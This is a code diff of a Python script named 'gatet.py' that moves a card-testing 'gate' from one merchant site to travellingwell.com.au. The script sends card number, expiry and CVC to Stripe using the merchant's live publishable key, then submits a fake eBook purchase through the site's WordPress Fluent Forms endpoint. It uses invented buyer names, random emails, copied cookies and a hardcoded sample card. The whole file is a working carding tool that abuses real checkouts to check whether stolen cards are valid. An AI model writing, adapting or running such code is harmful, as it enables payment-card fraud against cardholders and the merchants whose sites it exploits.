@@ -1,3 +1,4 @@
+# gatet.py - Travellingwell.com.au version
 import requests
 import random
 import json
@@ -14,15 +15,10 @@ def Tele(ccx):
         if "20" in yy:
             yy = yy.split("20")[1]
         
-        r = requests.session()
         user = generate_user_agent()
         
-        random1 = random.randint(1, 9)
-        random2 = random.randint(1, 99)
-        random3 = random.randint(20, 999)
-        random_name = f"User{random.randint(1,999)}"
+        random_num = random.randint(20, 999)
         random_email = f"user{random.randint(1,9999)}@gmail.com"
-        random_amount = round(random.uniform(0.5, 5.0), 2)
         
         # ============ FIRST REQUEST: Create Payment Method ============
         headers1 = {
@@ -41,20 +37,23 @@ def Tele(ccx):
             'user-agent': user,
         }
         
-        data1 = f'type=card&billing_details[name]={random_name}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=780ea92f-ee68-43db-9225-72beb68142058722f5&muid=1147b8cb-3ae2-4f1f-b736-578ad6f2f2f1ddf5ff&sid=f6319f08-314c-410b-a730-5a5327e6f9547d17b0&pasted_fields=number&payment_user_agent=stripe.js%2F81274c9437%3B+stripe-js-v3%2F81274c9437%3B+card-element&referrer=https%3A%2F%2Ftorr.ie&time_on_page=47632&client_attribution_metadata[client_session_id]=ea08e373-28fd-4326-aacb-9d0d3c590478&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=ecfbe540-0f90-4f0a-a99e-0fa569f10247&key=pk_live_51JVKouAs6DndN9b8mx4e9zfXHN3jWXh6L0V2n3xk59hs90Nqy9RuqM2nqdjQkKPOB5DwBgoe9poeThAhanhLNPi900zHJa87Tz'
+        data1 = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=780ea92f-ee68-43db-9225-72beb68142058722f5&muid=62576e70-cf26-4aab-9642-f57ba8bc8c0899d9bf&sid=77032959-d61f-4ef9-a8c4-3bc3dfa497f2df9220&pasted_fields=number&payment_user_agent=stripe.js%2F81274c9437%3B+stripe-js-v3%2F81274c9437%3B+card-element&referrer=https%3A%2F%2Fwww.travellingwell.com.au&time_on_page=77372&client_attribution_metadata[client_session_id]=93c3ba1b-ba92-4441-bfc8-6e3489e0c773&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=55cf4ee2-665a-4e5f-93a9-5142b74b94dc&key=pk_live_51SIkqdLknc83KPzcJBUu6tRJ06FLSDeUmBoRiGsJJW97R5RMIeFIOb4sYzUFjAahpd0czNIVCOc3Zs1202aF5HcU00gSnlcWBf'
         
         r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1)
+        
+        if r1.status_code != 200:
+            return {"error": f"Stripe API error: {r1.status_code}", "response": r1.text}
         
         pm = r1.json()['id']
         
         # ============ SECOND REQUEST: Submit Payment ============
         headers2 = {
-            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept': '*/*',
             'Accept-Language': 'en-US,en;q=0.9',
             'Connection': 'keep-alive',
             'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Origin': 'https://torr.ie',
-            'Referer': 'https://torr.ie/payments/',
+            'Origin': 'https://www.travellingwell.com.au',
+            'Referer': 'https://www.travellingwell.com.au/',
             'Sec-Fetch-Dest': 'empty',
             'Sec-Fetch-Mode': 'cors',
             'Sec-Fetch-Site': 'same-origin',
@@ -67,22 +66,22 @@ def Tele(ccx):
         
         # Cookies from curl
         cookies = {
-            '__stripe_mid': '1147b8cb-3ae2-4f1f-b736-578ad6f2f2f1ddf5ff',
-            '__stripe_sid': 'f6319f08-314c-410b-a730-5a5327e6f9547d17b0',
+            '_ga': 'GA1.1.1363319179.1780854480',
+            '__stripe_mid': '62576e70-cf26-4aab-9642-f57ba8bc8c0899d9bf',
+            '__stripe_sid': '77032959-d61f-4ef9-a8c4-3bc3dfa497f2df9220',
+        }
+        
+        params = {
+            't': '1780854564052',
         }
         
         data2 = {
-            'action': 'wp_full_stripe_inline_payment_charge',
-            'wpfs-form-name': 'default',
-            'wpfs-form-get-parameters': '{}',
-            'wpfs-custom-amount-unique': str(random_amount),
-            'wpfs-custom-input[]': random_name,
-            'wpfs-card-holder-email': random_email,
-            'wpfs-card-holder-name': random_name,
-            'wpfs-stripe-payment-method-id': pm,
+            'data': f'item_3__fluent_sf=&__fluent_form_embded_post_id=15&_fluentform_3_fluentformnonce=a43524378e&_wp_http_referer=%2F&names%5Bfirst_name%5D=Fyrr&names%5Blast_name%5D=Ddttr&email={random_email}&payment_input=Travelling%20Well%20eBook%20-%20EPUB%20(%246.95)&item-quantity=1&payment_method=stripe&__stripe_payment_method_id={pm}',
+            'action': 'fluentform_submit',
+            'form_id': '3',
         }
         
-        r2 = requests.post('https://torr.ie/wp-admin/admin-ajax.php', headers=headers2, cookies=cookies, data=data2)
+        r2 = requests.post('https://www.travellingwell.com.au/wp-admin/admin-ajax.php', params=params, headers=headers2, cookies=cookies, data=data2)
         
         return r2.json()
     
@@ -91,6 +90,7 @@ def Tele(ccx):
 
 # ============ MAIN EXECUTION ============
 if __name__ == "__main__":
-    card_data = "5336213216036270|06|26|815"
+    # Format: card_number|month|year|cvc
+    card_data = "5362262069378401|09|27|690"
     result = Tele(card_data)
     print(json.dumps(result, indent=2))
